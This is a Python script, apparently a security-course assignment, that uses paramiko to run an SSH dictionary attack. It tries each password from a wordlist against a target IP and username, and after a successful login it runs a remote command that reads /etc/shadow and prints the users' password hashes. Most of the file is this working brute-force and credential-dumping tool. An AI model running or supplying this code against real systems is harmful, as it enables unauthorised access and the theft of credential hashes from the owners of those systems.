#!/usr/bin/python3

# Script: Ops 401 Class 17 script
# Author: Paul Stroud
# Date of latest revision: 05/09/23
# Purpose: Brute force pt2
# Resources used: google, stackoverflow, github demo, chatgpt

# MAIN REQS:
# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

# OPTIONAL REQS: (aka Stretch Goals)
# Dump the user credential hashes of the victim system and print them to the screen.

import sys    # for args and sys.exit() to kill the script
import time   # for time.sleep() timeout

import paramiko # for SSH connections and remote execution

### FUNCTIONS ####

# SSH connect to <host> on <port> using <username>:<pw>
def connect_ssh(host, username, pw, port=22):
    print(f"[{username}@{host}] Trying password '{pw}':   ", end="")
    
    # set up an SSH client object
    ssushi = paramiko.SSHClient()
    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)  
    
    try:  # attempt connection
      ssushi.connect(host, port, username, pw)  # attempt connection with given credentials
      print("SUCCESS!") # boom
      return ssushi     # return connection handle
    
    except paramiko.AuthenticationException:  # bad login
      print("fail")
      return None

    except KeyboardInterrupt:   # Ctrl+C interrupt
      print("\nStopped by user. Exiting...")
      sys.exit()

   

#### MAIN ####


try:    # grab parameters from script arguments
    ip = sys.argv[1]        # target ip
    user = sys.argv[2]      # username for SSH login
    wordlist = sys.argv[3]  # dictionary file
except: # incorrect number of args
    print("Invalid arguments.\n" \
          "Please provide 3 arguments for this script.\n" \
          "Format: <ip> <username> <wordlist>\n\n" \
          "Exiting...")
    sys.exit()


# menu loop
while True:
    time.sleep(1)
    print("\n>>> Password Iterator v2.0 <<<")
    print("Select the operation to perform:" \
          f"\n\t1. SSH Dictionary Attack on {ip}" \
          f"\n\t2. Password Lookup in {wordlist}" \
          "\n\t0. Exit")

    op = -1  # holds user input
    while not (op >= 0 and op <= 2):
      try:
         op = int(input("Enter a menu option (0-2): "))
      except KeyboardInterrupt:   # Ctrl+C
         print()
         sys.exit()
      except: # catch all for anything other than menu options or Ctrl+C
         print("Invalid input. Please try again.")

    if op == 0:
      print("Exiting the script...")
      sys.exit()  # kill the script
    else:
      if op == 1:   # password iterator
        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:   # iterate over each line/word in the wordlist
               ssh = connect_ssh(ip, user, pw.strip())  # try pw for SSH login
               if (ssh != None):  # valid SSH socket?
                  try:
                      print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
                      # execute remote command to grab pw hashes
                      ssh_in, ssh_out, ssh_err = ssh.exec_command("sudo cat /etc/shadow | grep -v -e '*' -e '!' | awk -F ':' '{ print $1 \"\t\"  $2 }'")
                      print(ssh_out.read().decode("ASCII")) # decode as ASCII and dump to stdout
                      print("^^^ END OF HASHES ^^^")
                  
                  except Exception as exc:  # it's broken
                      print(f"Error retrieving password hashes. Exception: {exc}")
                  
                  break   # exit the loop after finding the right password

               time.sleep(1)  # delay before trying the next pw
        except FileNotFoundError: print(f"File {wordlist} does not exist")

      if op == 2:   # password lookup
        test = input("Input the password to look up: ")
        print(f"Looking for {test} in {wordlist}:")
        i = 0   # line counter
        try:
            file = open(wordlist, "rt")
            for pw in file:
               i += 1
               if (test == pw.strip()):
                 print(f"MATCH FOUND!   Line {i}: {test} - {pw.strip()}")
        except FileNotFoundError: print(f"File {wordlist} does not exist")

# end of script